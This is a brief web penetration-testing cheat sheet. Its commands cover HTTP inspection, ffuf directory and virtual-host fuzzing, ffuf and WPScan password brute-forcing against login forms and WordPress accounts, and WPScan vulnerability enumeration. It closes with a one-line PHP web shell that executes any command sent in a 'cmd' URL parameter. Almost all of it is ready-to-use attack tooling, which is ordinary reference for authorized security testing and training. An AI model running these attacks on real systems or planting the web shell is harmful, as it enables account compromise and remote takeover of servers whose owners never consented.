# Web

## HTTP inspection

Inspect headers, redirects, and the response body.

```bash
curl -isk <URL>
```

## Directory fuzzing

Discover paths and filter ordinary not-found responses.

```bash
ffuf -w <WORDLIST> -u <URL>/FUZZ -mc all -fc 404
```

## POST parameter fuzzing

Fuzz a form value in an authorized login request.

```bash
ffuf -w <WORDLIST> -X POST -d "username=admin&password=FUZZ" -u <URL>/login
```

## Virtual-host fuzzing

Discover name-based virtual hosts; set the baseline size for the target.

```bash
ffuf -w <WORDLIST> -u <URL>/ -H "Host: FUZZ.<DOMAIN>" -mc all -fs <BASELINE_SIZE>
```

## WPScan enumeration

Enumerate WordPress users, vulnerable plugins, and vulnerable themes.

```bash
wpscan --url <URL> --enumerate vp,vt,u
```

## WPScan password attempts

Attempt a supplied password list against one or more authorized accounts.

```bash
wpscan --url <URL> --usernames <USER> --passwords <WORDLIST>
wpscan --url <URL> --usernames <USER1>,<USER2> --passwords <WORDLIST>
```

## PHP command web shell

Execute a command supplied in the `cmd` query parameter.

```php
<?php system($_GET['cmd']); ?>
```
